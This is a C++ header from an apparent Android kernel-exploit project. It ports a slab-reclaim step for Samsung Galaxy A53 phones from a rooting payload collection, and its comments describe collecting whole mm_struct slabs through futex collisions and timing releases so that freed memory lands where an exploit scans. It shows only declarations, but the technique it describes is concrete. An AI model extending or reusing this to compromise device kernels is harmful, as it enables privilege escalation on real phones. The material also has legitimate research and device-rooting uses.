/* mm_struct reclaim for the Exynos 1280 layout.
 *
 * Ported from Root-My-Galaxy-Payloads
 * src/targets/a53x-A536EXXSNGZG3/page.c. Two behaviours there are what make
 * the leak reliable on this SoC, and neither exists in the generic path:
 *
 *  1. A single leaked mm_struct is not enough. The target has to be a *whole*
 *     order-3 slab, every object of which resolves under all collision futexes
 *     -- collect_full_normal_group() keeps re-running the hunt until it holds
 *     `ORDER3_SIZE / MM_STRUCT_SZ` of them, grouped by slab base.
 *
 *  2. The slab only becomes reclaimable under drain pressure.
 *     drain_group() pins A53_TRIGGER_SLABS * batch additional references,
 *     releases all but the last target reference, waits, and only then frees
 *     the tail -- so the SLUB free actually lands where the scan looks.
 *
 * DMA32 candidates are held and discarded rather than used: upstream documents
 * that they do not reclaim into the SKB allocation path on this device.
 *
 * Only the driver lives here. src/core/kernelsnitch/ is untouched; everything
 * below is expressed through the public context_* API that page.c's staged C
 * calls map onto. See docs/development/a53-reclaim-port-plan.md.
 */
#ifndef GHOSTLOCK_SUPPORT_A53_RECLAIM_HPP
#define GHOSTLOCK_SUPPORT_A53_RECLAIM_HPP

#include <cstddef>
#include <cstdint>

namespace ghostlock::support {

/* Result of one reclaim attempt.
 *
 * `held` receives one memfd per mm_struct in the chosen slab when the group
 * completed, so the caller can reproduce page.c's release order: all but the
 * last, then the tail after drain pressure. `held_len` is zero unless
 * `complete` is set. */
struct A53ReclaimGroup {
    std::uintptr_t base = 0;
    int32_t *held = nullptr;
    std::size_t held_len = 0;
    std::size_t batch = 0;
    bool complete = false;
};

/* Number of mm_struct objects in one order-3 slab. */
[[nodiscard]] std::size_t a53_mm_objs_per_slab(std::size_t mm_struct_sz) noexcept;

/* True when `mm` sits in the normal-zone physmap window and is aligned to an
 * mm_struct slot inside its slab. The tag nibble must already be canonical. */
[[nodiscard]] bool a53_valid_normal_mm(std::uintptr_t mm, std::size_t mm_struct_sz,
                                       std::size_t batch) noexcept;

/* Fill `group` with every mm_struct of one normal-zone slab.
 *
 * Runs up to A53_PAGE_SCAN_MAX hunts, reusing a confirmed slab base as a hint
 * (two collisions per hunt, which is cheaper) and falling back to four when
 * the hint stops matching. Returns false when no complete group was collected;
 * `group->held` is null in that case and nothing needs releasing. */
[[nodiscard]] bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz,
                                          std::size_t mm_slab_order, A53ReclaimGroup *group) noexcept;

/* Apply drain pressure and release the group's references in page.c's order.
 *
 * Pins A53_TRIGGER_SLABS * batch references, closes all but the last target
 * reference, sleeps one second, closes one reference per trigger batch, then
 * closes the target tail. Takes ownership of group->held either way. */
void a53_drain_group(A53ReclaimGroup *group) noexcept;

} // namespace ghostlock::support

#endif // GHOSTLOCK_SUPPORT_A53_RECLAIM_HPP